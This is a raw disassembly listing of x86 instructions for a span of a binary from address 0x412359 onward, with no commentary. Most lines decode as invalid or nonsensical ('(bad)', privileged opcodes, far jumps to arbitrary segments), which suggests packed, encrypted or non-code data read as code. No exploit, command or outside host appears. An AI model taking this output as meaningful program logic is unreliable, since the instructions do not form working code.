  412359:	adc    dl,BYTE PTR [ebp+edx*4-0x43]
  41235d:	sub    BYTE PTR [ecx],0x53
  412360:	(bad)  
  412361:	aam    0xa
  412363:	aas    
  412364:	invd   
  412366:	push   ecx
  412367:	inc    edi
  412368:	adc    DWORD PTR [ebp-0x1f1f2a54],0x31
  41236f:	shl    DWORD PTR [ebx],cl
  412371:	mov    ecx,0x9b9dba1a
  412376:	es ds repnz (bad) 
  41237a:	ret    
  41237b:	xor    ecx,DWORD PTR [ebx]
  41237d:	stc    
  41237e:	aas    
  41237f:	or     DWORD PTR [esi],0xfe242298
  412385:	mov    esp,0xc453048a
  41238a:	out    dx,eax
  41238b:	shr    BYTE PTR [ecx+0x17],1
  41238e:	int    0xde
  412390:	mov    cl,0xdc
  412392:	sub    al,ch
  412394:	lea    esi,[edi]
  412396:	(bad)  
  412397:	xchg   esp,eax
  412398:	sar    esp,0x6f
  41239b:	(bad)  
  41239c:	(bad)  
  41239e:	jp     0x4123b9
  4123a0:	pop    ds
  4123a1:	xchg   ecx,eax
  4123a2:	pusha  
  4123a3:	outs   dx,DWORD PTR ds:[esi]
  4123a4:	jnp    0x412367
  4123a6:	iret   
  4123a7:	pop    es
  4123a8:	fadd   DWORD PTR [ebx+0x34a150fe]
  4123ae:	cmp    BYTE PTR [ebx+0x46],cl
  4123b1:	cmp    edx,edi
  4123b3:	lahf   
  4123b4:	jns    0x4123a2
  4123b6:	add    edx,DWORD PTR ds:0x106e5665
  4123bc:	mov    edi,DWORD PTR [esi-0x1b21af59]
  4123c2:	lds    esp,FWORD PTR [esi-0x50]
  4123c5:	push   esp
  4123c6:	push   0x84d9b073
  4123cb:	dec    ebp
  4123cc:	cli    
  4123cd:	push   ss
  4123ce:	pushf  
  4123cf:	pop    ebx
  4123d0:	enter  0xe821,0xd9
  4123d4:	aam    0x28
  4123d6:	sbb    al,0x5a
  4123d8:	popf   
  4123d9:	sub    eax,0xa00ad7f2
  4123de:	(bad)  
  4123df:	and    eax,0xe1c9f9df
  4123e4:	jle    0x4123fe
  4123e6:	pop    esp
  4123e7:	inc    DWORD PTR [edi-0x19]
  4123ea:	xchg   ebp,eax
  4123eb:	retf   0x53ec
  4123ee:	pop    ecx
  4123ef:	fs push ebx
  4123f1:	sbb    eax,DWORD PTR [ecx+0x247196bf]
  4123f7:	jns    0x41237c
  4123f9:	cdq    
  4123fa:	cmp    al,0x50
  4123fc:	push   eax
  4123fd:	dec    eax
  4123fe:	leave  
  4123ff:	pusha  
  412400:	xchg   ecx,ebx
  412402:	test   al,0xa9
  412404:	stos   BYTE PTR es:[di],al
  412406:	rcl    BYTE PTR [edi],1
  412408:	pop    eax
  412409:	fsub   st(5),st
  41240b:	xchg   edx,eax
  41240c:	push   ebp
  41240d:	sti    
  41240e:	jmp    0x15b8:0xe24663f1
  412415:	in     eax,dx
  412416:	and    ecx,DWORD PTR [ecx]
  412418:	mov    ebx,0xce7e9bdf
  41241d:	xchg   edx,eax
  41241e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41241f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412420:	cmp    DWORD PTR [edi-0x7a],ebp
  412423:	jne    0x4123ca
  412425:	es push ecx
  412427:	lahf   
  412428:	(bad)  [ecx]
  41242a:	(bad)  
  41242b:	fs cmp cl,bh
  41242e:	(bad)  [edx+0x11c34aa1]
  412434:	outs   dx,DWORD PTR ds:[esi]
  412435:	sub    DWORD PTR [ecx-0x1fb7e7b2],0x8b80c83
  41243f:	jl     0x412446
  412441:	(bad)  
  412442:	jg     0x412447
  412444:	popf   
  412445:	popa   
  412446:	sti    
  412447:	mov    bl,0x75
  412449:	xchg   esi,eax
  41244a:	mov    edi,0x571e5b72
  41244f:	inc    ebx
  412450:	sub    DWORD PTR [ecx-0x2270f43f],esi
  412456:	dec    edx
  412457:	lahf   
  412458:	dec    esp
  412459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41245a:	xchg   edx,eax
  41245b:	std    
  41245c:	std    
  41245d:	or     eax,0x8524d5d8
  412462:	and    BYTE PTR [esi+0x458e356b],dh
  412468:	sbb    ebx,DWORD PTR [ebp+0x65]
  41246b:	mov    ebp,0xba7a6d5f
  412470:	mov    edi,0xdf1c158b
  412475:	lock data16 loop 0x412440
  412479:	gs aam 0xd7
  41247c:	js     0x41246e
  41247e:	or     eax,0x965c14ed
  412483:	sub    al,0xc3
  412485:	(bad)  
  412486:	or     ebp,DWORD PTR [ebp*1+0x828512e]
  41248d:	xor    BYTE PTR [ebx+edx*4+0x5b5fb852],ch
  412494:	jecxz  0x4124d7
  412496:	cmp    ebx,esi
  412498:	push   0x87066032
  41249d:	push   ecx
  41249e:	sbb    dl,BYTE PTR [edi-0x29ea22f2]
  4124a4:	and    al,BYTE PTR [edi-0x60]
  4124a7:	test   BYTE PTR ds:0xfabd9595,cl
  4124ad:	lahf   
  4124ae:	dec    ebx
  4124af:	mov    ds:0x227c3654,al
  4124b4:	ret    0xbd38
  4124b7:	and    esp,DWORD PTR [ecx]
  4124b9:	push   edi
  4124ba:	push   ecx
  4124bb:	and    BYTE PTR [ecx-0x27],ah
  4124be:	test   ah,al
  4124c0:	std    
  4124c1:	dec    ecx
  4124c2:	pop    ebp
  4124c3:	push   ss
  4124c4:	lds    ebx,FWORD PTR [edi]
  4124c6:	gs inc edx
  4124c8:	cld    
  4124c9:	sbb    al,0xa0
  4124cb:	out    dx,eax
  4124cc:	mov    ah,0x76
  4124ce:	stos   BYTE PTR es:[edi],al
  4124cf:	sbb    eax,0x18352d43
  4124d4:	xchg   DWORD PTR [edi],esp
  4124d6:	xor    ebx,ebp
  4124d8:	sbb    ecx,DWORD PTR [esi+ecx*1-0x14]
  4124dc:	inc    ecx
  4124dd:	mov    esp,0x80bdda64
  4124e2:	or     BYTE PTR [ecx],dl
  4124e4:	sar    DWORD PTR [ecx],0xce
  4124e7:	mov    ah,0xea
  4124e9:	fdivr  st,st(6)
  4124eb:	pop    ss
  4124ec:	ret    
  4124ed:	(bad)  
  4124ee:	call   0xfed4ee6
  4124f3:	(bad)  [esi]
  4124f5:	inc    edi
  4124f6:	arpl   WORD PTR [ebx+edi*4],cx
  4124f9:	das    
  4124fa:	mov    esp,0x911045ad
  4124ff:	enter  0x52b4,0x7c
  412503:	shr    DWORD PTR cs:[ecx],cl
  412506:	mov    dh,0x2
  412508:	dec    eax
  412509:	repnz mov cs,WORD PTR ds:0xd9dd5461
  412510:	(bad)  
  412511:	sar    BYTE PTR [ecx+0x78e0030f],1
  412517:	push   cs
  412518:	and    BYTE PTR [ebx],0x45
  41251b:	stos   BYTE PTR es:[edi],al
  41251c:	xchg   edi,edx
  41251e:	dec    ebx
  41251f:	rcr    BYTE PTR [esi+0x18],cl
  412522:	adc    ah,dh
  412524:	inc    ecx
  412525:	pop    esi
  412526:	jecxz  0x4124fc
  412528:	es sub dl,ch
  41252b:	push   bx
  41252d:	dec    eax
  41252e:	xchg   ebp,eax
  41252f:	and    DWORD PTR [eax+0x19],edi
  412532:	aad    0x24
  412534:	pop    eax
  412535:	cdq    
  412536:	mov    BYTE PTR [ecx],ch
  412538:	cmp    ebx,DWORD PTR [edi-0x59]
  41253b:	inc    esi
  41253c:	stos   DWORD PTR es:[edi],eax
  41253d:	fmul   DWORD PTR [esi+0x59]
  412540:	mov    dl,ah
  412542:	push   ecx
  412543:	fisttp WORD PTR [edx]
  412545:	repz mov al,ds:0xa62dc148
  41254b:	jnp    0x41253d
  41254d:	jecxz  0x4124e8
  41254f:	or     ebx,ebx
  412551:	mov    es,esi
  412553:	addr16 add eax,0x44621bd4
  412559:	sbb    dl,al
  41255b:	nop
  41255c:	stos   DWORD PTR es:[edi],eax
  41255d:	jae    0x41256f
  41255f:	rcr    ebp,0x5a
  412562:	enter  0xb39b,0x9c
  412566:	test   DWORD PTR [ebx+0x5cb5161e],0xb50a7793
  412570:	mov    ds:0x7e010959,eax
  412575:	lock int 0x3c
  412578:	push   ebp
  412579:	jns    0x41259c
  41257b:	inc    esi
  41257c:	push   0xffffff89
  41257e:	push   0xffffffb6
  412580:	mov    ah,0x24
  412582:	push   ss
  412583:	sahf   
  412584:	test   BYTE PTR [edx-0x6e],bl
  412587:	loope  0x41258e
  412589:	xor    eax,DWORD PTR [ebp+0x4eb4cfc9]
  41258f:	loop   0x4125b5
  412591:	js     0x41256e
  412593:	in     al,0xe0
  412595:	mov    esi,0xa67b14c5
  41259a:	cmp    BYTE PTR [eax-0x45],0x8c
  41259e:	sbb    cl,BYTE PTR [edx]
  4125a0:	push   ds
  4125a1:	jl     0x412587
  4125a3:	xchg   DWORD PTR [ecx-0x56],edi
  4125a6:	mov    dh,0x34
  4125a8:	in     eax,0x23
  4125aa:	je     0x4125ad
  4125ac:	and    cl,BYTE PTR [edx+0x53a1971]
  4125b2:	sbb    DWORD PTR [edi+0x566bc500],eax
  4125b8:	cmp    BYTE PTR [eax-0x11],al
  4125bb:	sbb    bl,ch
  4125bd:	pop    ds
  4125be:	test   eax,0x96bf0ddb
  4125c3:	sbb    dl,BYTE PTR [edx+0x1c]
  4125c6:	jne    0x412644
  4125c8:	fwait
  4125c9:	das    
  4125ca:	js     0x412573
  4125cc:	imul   eax,DWORD PTR [eax+eiz*1-0x1a1df7e],0x5d
  4125d4:	mov    WORD PTR [ebx-0x3e],fs
  4125d7:	(bad)  
  4125d8:	fnstsw WORD PTR [ecx-0x1e]
  4125db:	adc    dh,BYTE PTR [esi+0x6b1aa60c]
  4125e1:	outs   dx,DWORD PTR ds:[esi]
  4125e2:	mov    al,0xb3
  4125e4:	mov    ds:0x585a4278,eax
  4125e9:	enter  0xa81a,0x8
  4125ed:	stos   DWORD PTR es:[edi],eax
  4125ee:	in     eax,0xef
  4125f0:	or     al,0xc9
  4125f2:	pop    ss
  4125f3:	cmp    eax,0xca33dbfe
  4125f8:	mov    es,WORD PTR [ebx-0x3de98907]
  4125fe:	loop   0x412605
  412600:	mov    ebx,0x2eb5b3d3
  412605:	jp     0x41266e
  412607:	bound  ebx,QWORD PTR [esi-0x1f]
  41260a:	mov    BYTE PTR [esi-0x35],ch
  41260d:	adc    al,0x9d
  41260f:	pop    esp
  412610:	sbb    dl,BYTE PTR [esi-0x2675091c]
  412616:	add    al,0x3b
  412618:	and    al,0x6e
  41261a:	cld    
  41261b:	out    dx,al
  41261c:	jno    0x4125fd
  41261e:	outs   dx,BYTE PTR ds:[esi]
  41261f:	xor    al,0x12
  412621:	cmp    al,0x6d
  412623:	push   ebx
  412624:	pop    edx
  412625:	mov    ebp,0xe170a51a
  41262a:	pusha  
  41262b:	ins    BYTE PTR es:[edi],dx
  41262c:	and    dl,BYTE PTR [ecx-0x28614183]
  412632:	or     eax,0x82e021f
  412637:	mov    edx,0x5401a15f
  41263c:	jnp    0x4126ac
  41263e:	repz adc al,0x12
  412641:	clc    
  412642:	repz das 
  412644:	xchg   esi,eax
  412645:	xor    eax,0x26a702a5
  41264a:	jp     0x412652
  41264c:	(bad)  
  41264d:	push   ecx
  41264e:	dec    eax
  41264f:	in     al,dx
  412650:	test   DWORD PTR [edi+0x3c],ebp
  412653:	test   BYTE PTR [esi],ch
  412655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412656:	nop
  412657:	in     eax,dx
  412658:	sbb    eax,DWORD PTR [eax+0x0]
  41265b:	pop    ss
  41265c:	inc    esp
  41265d:	fmul   DWORD PTR [ebx+0x7e538956]
  412663:	mov    edx,0xe64969c6
  412668:	test   al,0x81
  41266a:	les    esp,FWORD PTR [ebp+0x60d101e5]
  412670:	jne    0x4125f2
  412672:	jle    0x412610
  412674:	sub    bh,ah
  412676:	std    
  412677:	stos   BYTE PTR es:[edi],al
  412678:	push   esp
  412679:	gs ror bl,0x45
  41267d:	push   ecx
  41267e:	mov    ds:0x49fee8b,eax
  412683:	xor    DWORD PTR [ecx+0x10],ecx
  412686:	fisttp WORD PTR [ecx+0x4fac9a7b]
  41268c:	sbb    DWORD PTR [ebp-0x47e18e7d],0x63
  412693:	sahf   
  412694:	in     al,dx
  412695:	fadd   QWORD PTR [edi]
  412697:	int3   
  412698:	push   cs
  412699:	retf   0xf469
  41269c:	sub    DWORD PTR [eax+eiz*8],esp
  41269f:	jbe    0x4126d7
  4126a1:	(bad)  
  4126a2:	adc    eax,0xfc92d8ca
  4126a7:	push   edi
  4126a8:	ins    DWORD PTR es:[edi],dx
  4126a9:	pop    ecx
  4126aa:	sbb    DWORD PTR [ebx+0x2afec395],ebp
  4126b0:	adc    BYTE PTR [edi+eax*2+0xb],0xa4
  4126b5:	bnd jle 0x412698
  4126b8:	pop    edi
  4126b9:	sbb    esi,DWORD PTR [edx-0x4375b8a6]
  4126bf:	inc    eax
  4126c0:	data16 in al,0xc5
  4126c3:	push   ss
  4126c4:	xchg   edi,eax
  4126c5:	jns    0x4126a0
  4126c7:	mov    ch,0xfc
  4126c9:	pop    ebx
  4126ca:	ds pop esp
  4126cc:	ret    
  4126cd:	dec    edi
  4126ce:	add    eax,0xfb8a17ae
  4126d3:	inc    ebp
  4126d4:	retf   0x70ed
  4126d7:	cs cmc 
  4126d9:	pop    ebx
  4126da:	stos   BYTE PTR es:[edi],al
  4126db:	xchg   edi,eax
  4126dc:	scas   eax,DWORD PTR es:[edi]
  4126dd:	inc    ebp
  4126de:	fstp   QWORD PTR [esi]
  4126e0:	test   DWORD PTR ds:0xc1a5cb6,ebx
  4126e6:	in     al,0x6a
  4126e8:	xor    bh,BYTE PTR [edx]
  4126ea:	loope  0x4126c3
  4126ec:	sti    
  4126ed:	mov    eax,ds:0x6792b179
  4126f2:	mov    ds,WORD PTR [ecx+ecx*1-0x2c]
  4126f6:	xchg   sp,ax
  4126f8:	fild   WORD PTR [ecx]
  4126fa:	loope  0x412734
  4126fc:	(bad)  
  4126fd:	push   ebp
  4126fe:	and    bh,BYTE PTR [ebp-0x7140db65]
  412704:	jge    0x4126c2
  412706:	dec    edi
  412707:	inc    edx
  412708:	pop    edx
  412709:	aam    0xd1
  41270b:	call   DWORD PTR [ebx]
  41270d:	out    0xae,al
  41270f:	mov    cs,WORD PTR [esi+eiz*8]
  412712:	clc    
  412713:	push   cs
  412714:	xchg   DWORD PTR [eax],edi
  412716:	inc    bx
  412718:	cmp    esi,ecx
  41271a:	mov    ebp,0xf59503c3
  41271f:	cmp    BYTE PTR [edx+0x84104f3],0xfe
  412726:	rcl    BYTE PTR [ebx],0x5f
  412729:	scas   al,BYTE PTR es:[edi]
  41272a:	sbb    dh,dl
  41272c:	fsubr  QWORD PTR [ecx+esi*4-0x7da04c16]
  412733:	inc    ebx
  412734:	push   cs
  412735:	sbb    al,0x63
  412737:	push   esi
  412738:	sbb    BYTE PTR [edi-0x6a],dl
  41273b:	mov    al,ds:0xa9a9c4d7
  412740:	mov    eax,ebx
  412742:	pop    ds
  412743:	sbb    cl,BYTE PTR [ebp-0x7f]
  412746:	xchg   cl,dl
  412748:	into   
  412749:	loop   0x41278f
  41274b:	push   ebp
  41274c:	lds    esp,FWORD PTR [eax-0x5a]
  41274f:	and    bl,BYTE PTR [edi+ebx*4+0x16]
  412753:	sbb    edx,DWORD PTR [eax-0x558b1687]
  412759:	dec    eax
  41275a:	inc    eax
  41275b:	or     ebx,DWORD PTR [ebx-0x3b]
  41275e:	getsec 
  412760:	add    BYTE PTR [edx+0x42],dh
  412763:	mov    edi,0x453977f0
  412768:	inc    eax
  412769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41276a:	cli    
  41276b:	dec    ebx
  41276c:	fst    QWORD PTR [ecx+edx*4]
  41276f:	and    eax,0x7881e7bb
  412774:	mov    edx,0x1ce44612
  412779:	gs stos DWORD PTR es:[edi],eax
  41277b:	outs   dx,DWORD PTR ds:[esi]
  41277c:	push   cs
  41277d:	mov    esi,0xde133b49
  412782:	dec    edx
  412783:	sbb    DWORD PTR [edi+0x3f19895f],edi
  412789:	jge    0x4127b2
  41278b:	sbb    DWORD PTR es:[eax],eax
  41278e:	inc    eax
  41278f:	and    al,0x6e
  412791:	inc    eax
  412792:	mov    dl,0x7
  412794:	(bad)  
  412795:	fbstp  TBYTE PTR [ecx]
  412797:	aaa    
  412798:	mov    ebp,0x975ebfc1
  41279d:	push   0x6b
  41279f:	es ret 
  4127a1:	sub    eax,0x8bda917c
  4127a6:	dec    esi
  4127a7:	inc    edi
  4127a8:	or     esp,eax
  4127aa:	(bad)
  4127ad:	push   cs
  4127ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127af:	jnp    0x4127f2
  4127b1:	sub    bl,ch
  4127b3:	jno    0x412740
  4127b5:	mov    WORD PTR [eax-0x5d],ss
  4127b8:	mov    al,0x76
  4127ba:	sub    dl,BYTE PTR [esi-0xfc93c71]
  4127c0:	pusha  
  4127c1:	add    bl,BYTE PTR [edi+eiz*2+0x656931b2]
  4127c8:	imul   esp,DWORD PTR [edx+0x1f],0x8896298d
  4127cf:	sahf   
  4127d0:	repnz arpl WORD PTR [ecx-0x7d3d9abf],bp
  4127d7:	ds call 0xb1e2:0x89a47765
  4127df:	adc    bh,al
  4127e1:	xor    al,0x29
  4127e3:	cmp    BYTE PTR [ebx+0x28],ch
  4127e6:	int    0xd9
  4127e8:	fidivr DWORD PTR [edx-0x3c]
  4127eb:	in     eax,dx
  4127ec:	arpl   WORD PTR [eax-0x49fe0985],dx
  4127f2:	mov    ch,0xbd
  4127f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127f5:	retf   
  4127f6:	(bad)  
  4127f7:	ins    DWORD PTR es:[edi],dx
  4127f8:	jns    0x41284e
  4127fa:	fdiv   DWORD PTR [eax-0x52]
  4127fd:	out    dx,eax
  4127fe:	test   al,0xb6
  412800:	xchg   ebp,eax
  412801:	inc    eax
  412802:	pop    ds
  412803:	je     0x4127bf
  412805:	outs   dx,DWORD PTR ds:[esi]
  412806:	and    al,0x98
  412808:	push   esp
  412809:	test   al,0x5f
  41280b:	cli    
  41280c:	sub    ah,dl
  41280e:	push   ecx
  41280f:	sbb    dl,cl
  412811:	(bad)  
  412812:	xor    al,0x1c
  412814:	mov    BYTE PTR [esi-0x5],ah
  412817:	addr16 fs loop 0x4127fc
  41281b:	pop    ds
  41281c:	test   BYTE PTR ds:0xdef0d050,0xc7
  412823:	in     al,dx
  412824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412825:	dec    ebp
  412826:	and    BYTE PTR [eax],bh
  412828:	mov    esp,0x8729b56
  41282d:	or     eax,0x319d2691
  412832:	pop    esi
  412833:	sar    bl,0x6b
  412836:	mov    al,cl
  412838:	es pop ebx
  41283a:	outs   dx,BYTE PTR ds:[esi]
  41283b:	mov    ds:0x99833a2e,eax
  412840:	je     0x412868
  412842:	daa    
  412843:	popa   
  412844:	sbb    eax,0x9fcf49f9
  412849:	mov    ebp,0x4e0b4d4
  41284e:	loopne 0x41285e
  412850:	mov    eax,0x19ca26f4
  412855:	loop   0x4127d8
  412857:	xchg   edx,eax
  412858:	push   es
  412859:	outs   dx,DWORD PTR ds:[esi]
  41285a:	cwde   
  41285b:	mov    BYTE PTR [ecx],al
  41285d:	addr16 out dx,al
  41285f:	jecxz  0x41280c
  412861:	sub    al,0x78
  412863:	pushf  
  412864:	out    0xeb,al
  412866:	push   es
  412867:	jmp    0x956cb250
  41286c:	xchg   edx,eax
  41286d:	jl     0x412832
  41286f:	retf   
  412870:	mov    ds:0x7450821,eax
  412875:	mov    esp,0x73730c5e
  41287a:	xchg   esi,eax
  41287b:	mov    esi,0x4c4a2010
  412880:	cmc    
  412881:	xchg   BYTE PTR ds:0x37db821a,dh
  412888:	ds push eax
  41288a:	outs   dx,DWORD PTR ds:[esi]
  41288b:	call   0x8ded:0x1d0d0a11
  412892:	stos   DWORD PTR es:[edi],eax
  412893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412894:	repz cmp cl,BYTE PTR [edi+0x2439ad2c]
  41289b:	sbb    eax,0x76a36428
  4128a0:	arpl   WORD PTR [ebx],sp
  4128a2:	sti    
  4128a3:	xchg   edx,eax
  4128a4:	popa   
  4128a5:	and    al,0xc0
  4128a7:	adc    eax,0x2f434667
  4128ac:	mov    bh,BYTE PTR [ebp+eax*8-0x480204a9]
  4128b3:	dec    ebx
  4128b4:	dec    edi
  4128b5:	loopne 0x412872
  4128b7:	pop    eax
  4128b8:	ja     0x412886
  4128ba:	and    DWORD PTR [edi+0x73cd9e3d],edx
  4128c0:	xchg   BYTE PTR [esi+edi*2-0x58],ch
  4128c4:	push   ecx
  4128c5:	or     al,0x45
  4128c7:	sbb    ah,BYTE PTR [eax-0x2c]
  4128ca:	push   ebx
  4128cb:	cmp    DWORD PTR [edi+0x7a],edx
  4128ce:	jle    0x4128cf
  4128d0:	outs   dx,DWORD PTR ds:[esi]
  4128d1:	fsub   QWORD PTR [esi+edi*2]
  4128d4:	pop    edx
  4128d5:	cmp    cl,bl
  4128d7:	repz cmp eax,0xeb59a083
  4128dd:	add    ecx,DWORD PTR [edi+0x22bb8500]
  4128e3:	lds    edx,FWORD PTR ss:[eax+0x64]
  4128e7:	inc    ebp
  4128e8:	mov    esp,0xcee9d5d2
  4128ed:	sub    bl,BYTE PTR [esi]
  4128ef:	arpl   WORD PTR [ecx+0x6ae7c9d0],ax
  4128f5:	sbb    BYTE PTR [edi+0x7e33cc7e],0x4d
  4128fc:	add    DWORD PTR [ecx],esp
  4128fe:	inc    ebp
  4128ff:	mov    bl,BYTE PTR [ebx]
  412901:	mov    al,ds:0x396208c4
  412906:	je     0x41291f
  412908:	sbb    al,0xd
  41290a:	jmp    0x5189:0xb7dacc47
  412911:	push   0xb
  412913:	and    eax,0x3efd87d0
  412918:	lea    edi,[ebx+ebx*8-0x29]
  41291c:	(bad)  
  41291d:	pop    esp
  41291e:	hlt    
  41291f:	mov    eax,ds:0x1ab7b9ac
  412924:	sbb    eax,0xa4db5f8b
  412929:	mov    al,cs:0xf1f4210a
  41292f:	mov    DWORD PTR [ecx],ecx
  412931:	lock adc BYTE PTR [edi-0xdfb3092],ch
  412938:	jbe    0x4128d3
  41293a:	stc    
  41293b:	int3   
  41293c:	push   0x8ec9beaa
  412941:	push   ebp
  412942:	mov    BYTE PTR [ecx-0x272eb39f],dh
  412948:	push   cs
  412949:	xchg   edx,eax
  41294a:	scas   eax,DWORD PTR es:[edi]
  41294b:	test   al,0xd3
  41294d:	mov    eax,ds:0xdeb22875
  412952:	outs   dx,DWORD PTR ds:[esi]
  412953:	jne    0x4129be
  412955:	shl    esp,cl
  412957:	adc    eax,0x614b218a
  41295c:	jae    0x412944
  41295e:	add    DWORD PTR [esi+eiz*8+0x1],0x77246009
  412966:	jmp    0x36cc:0xd6fd914c
  41296d:	stc    
  41296e:	push   0xec0ca65f
  412973:	aaa    
  412974:	sahf   
  412975:	popa   
  412976:	adc    ecx,ebp
  412978:	rcr    DWORD PTR [eax+0x80cf0eb],0x7a
  41297f:	rol    BYTE PTR [ecx+edi*2],1
  412982:	ds cmp al,0x20
  412985:	mov    ch,0x4b
  412987:	jns    0x41291c
  412989:	push   ss
  41298a:	pop    ecx
  41298b:	fisubr DWORD PTR [ebx]
  41298d:	cmp    ebx,edx
  41298f:	mov    al,ds:0xe4b12d66
  412994:	pop    esp
  412995:	adc    DWORD PTR [edx-0x7e],0xffffff9e
  412999:	jae    0x41299b
  41299b:	mov    al,ds:0xc9973537
  4129a0:	pop    esp
  4129a1:	xchg   BYTE PTR [edx+0x6109267f],ch
  4129a7:	jne    0x412971
  4129a9:	push   es
  4129aa:	adc    ah,BYTE PTR [eax]
  4129ac:	dec    edx
  4129ad:	pop    eax
  4129ae:	pop    ss
  4129af:	in     eax,dx
  4129b0:	add    eax,0x22027ba8
  4129b5:	daa    
  4129b6:	dec    ecx
  4129b7:	loop   0x4129e3
  4129b9:	lea    ebp,[esi-0x2c]
  4129bc:	pop    ebx
  4129bd:	and    ebp,DWORD PTR [esi]
  4129bf:	imul   ebx,esi,0xbabe77b9
  4129c5:	unpckhps xmm7,XMMWORD PTR [ebx+0x2e]
  4129c9:	jae    0x4129a9
  4129cb:	xor    BYTE PTR [edi],bh
  4129cd:	js     0x412a10
  4129cf:	sub    al,0x99
  4129d1:	or     bl,bl
  4129d3:	sub    bl,ch
  4129d5:	mov    bh,0x78
  4129d7:	inc    esi
  4129d8:	bound  edx,QWORD PTR [eax-0x39c83b2c]
  4129de:	mul    DWORD PTR [ecx+0x2de225bb]
  4129e4:	xor    eax,0x17e0c383
  4129e9:	ja     0x412a4b
  4129eb:	push   0xc0b65588
  4129f0:	in     eax,dx
  4129f1:	mov    bl,bl
  4129f3:	dec    eax
  4129f4:	shr    dh,cl
  4129f6:	mov    edx,0x6c362394
  4129fb:	pusha  
  4129fc:	jl     0x412a61
  4129fe:	aad    0xaf
  412a00:	pop    ds
  412a01:	xchg   BYTE PTR [esi+0x434de42],ah
  412a07:	jg     0x412a88
  412a09:	leave  
  412a0a:	dec    ecx
  412a0b:	(bad)  
  412a0c:	cmp    eax,0xa3386127
  412a11:	or     BYTE PTR [esi],0xf2
  412a14:	mov    ss:0x9f9a5a41,eax
  412a1a:	push   ds
  412a1b:	xchg   esp,eax
  412a1c:	push   edi
  412a1d:	cmp    cl,BYTE PTR ds:0x86646754
  412a23:	stos   DWORD PTR es:[edi],eax
  412a24:	loop   0x4129cd
  412a26:	inc    edx
  412a27:	gs mov esp,0x4640200a
  412a2d:	or     dl,BYTE PTR ds:0x3fe342fa
  412a33:	test   eax,0x4f6c67fc
  412a38:	mov    al,0xa6
  412a3a:	out    dx,ax
  412a3c:	push   esp
  412a3d:	mov    dh,al
  412a3f:	and    ch,BYTE PTR [edi-0x47]
  412a42:	adc    dh,dh
  412a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a45:	pop    eax
  412a46:	sahf   
  412a47:	pop    esp
  412a48:	jp     0x412aa4
  412a4a:	icebp  
  412a4b:	pop    edx
  412a4c:	clc    
  412a4d:	call   0xeeae3de5
  412a52:	inc    edi
  412a53:	inc    ecx
  412a54:	neg    ebx
  412a56:	add    eax,0x280d6f35
  412a5b:	sub    bh,BYTE PTR [eax+ecx*2]
  412a5e:	push   ds
  412a5f:	add    eax,0x4b93533f
  412a64:	imul   ecx,DWORD PTR [ebp+0x5c684810],0x3a
  412a6b:	int    0xe8
  412a6d:	cmp    eax,0xa8d748b9
  412a72:	cdq    
  412a73:	das    
  412a74:	popa   
  412a75:	call   0x126d:0xd73698f6
  412a7c:	mov    esp,0x59098c8c
  412a81:	popf   
  412a82:	int    0x89
  412a84:	inc    ebx
  412a85:	jmp    esi
  412a87:	sar    BYTE PTR [edi],cl
  412a89:	fs ret 0x268c
  412a8d:	scas   al,BYTE PTR es:[edi]
  412a8e:	mov    ds:0x4084f02a,al
  412a93:	retf   0x3315
  412a96:	ins    BYTE PTR es:[edi],dx
  412a97:	fstp   QWORD PTR [ebx-0x5f9d5167]
  412a9d:	lock clc 
  412a9f:	cmp    BYTE PTR [esi-0x33b5b71a],bh
  412aa5:	dec    ebp
  412aa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412aa7:	add    DWORD PTR [esi-0x40],0x2e
  412aab:	cmp    al,0x42
  412aad:	aam    0xaf
  412aaf:	test   eax,0x19d29580
  412ab4:	in     eax,0x70
  412ab6:	test   eax,0x2ee03430
  412abb:	push   edi
  412abc:	jmp    0x412a7b
  412abe:	fs push ebx
  412ac0:	test   al,0xb1
  412ac2:	inc    eax
  412ac3:	push   ecx
  412ac4:	out    dx,eax
  412ac5:	or     ecx,0xffcef7d
  412acb:	pop    ds
  412acc:	sbb    eax,DWORD PTR [edi]
  412ace:	sub    al,0x12
  412ad0:	mov    ch,0xa1
  412ad2:	mov    ch,0x1e
  412ad4:	js     0x412a83
  412ad6:	outs   dx,DWORD PTR ds:[esi]
  412ad7:	xchg   ecx,eax
  412ad8:	(bad)
  412adb:	popf   
  412adc:	jo     0x412b5d
  412ade:	icebp  
  412adf:	sub    dh,BYTE PTR [ecx-0x31002488]
  412ae5:	push   0x5e
  412ae7:	cmp    BYTE PTR [eax],0xd7
  412aea:	push   es
  412aeb:	ds ds cs mov esi,0x9485b2c
  412af3:	lahf   
  412af4:	popf   
  412af5:	retf   
  412af6:	xor    al,0xd9
  412af8:	add    DWORD PTR [eax+0x46f3f197],0x6b467f76
  412b02:	or     bl,BYTE PTR [ecx+0x409b9ebe]
  412b08:	jno    0x412b7c
  412b0a:	icebp  
  412b0b:	or     DWORD PTR [esi-0x73],edi
  412b0e:	cmp    dl,BYTE PTR [ecx]
  412b10:	nop
  412b11:	adc    esp,esp
  412b13:	sbb    al,0xe3
  412b15:	arpl   ax,di
  412b17:	icebp  
  412b18:	ja     0x412b6a
  412b1a:	push   eax
  412b1b:	dec    esp
  412b1c:	scas   al,BYTE PTR es:[edi]
  412b1d:	(bad)  
  412b1e:	and    bl,BYTE PTR [edi]
  412b20:	imul   edi,edi,0x43
  412b23:	rcr    cl,1
  412b25:	mov    edx,DWORD PTR [ecx-0x4e]
  412b28:	(bad)  
  412b29:	jno    0x412b31
  412b2b:	xchg   ebp,eax
  412b2c:	stos   DWORD PTR es:[edi],eax
  412b2d:	add    al,0x14
  412b2f:	xchg   edx,eax
  412b30:	fs mov bh,0x46
  412b34:	xor    BYTE PTR [eax-0x62],bl
  412b37:	shl    dh,cl
  412b39:	sar    BYTE PTR ds:0xdf30529c,cl
  412b3f:	lea    eax,[ebp-0x5b]
  412b42:	sbb    al,0x55
  412b44:	xchg   edi,eax
  412b45:	xor    BYTE PTR [ecx+0x4b],0xdb
  412b49:	push   eax
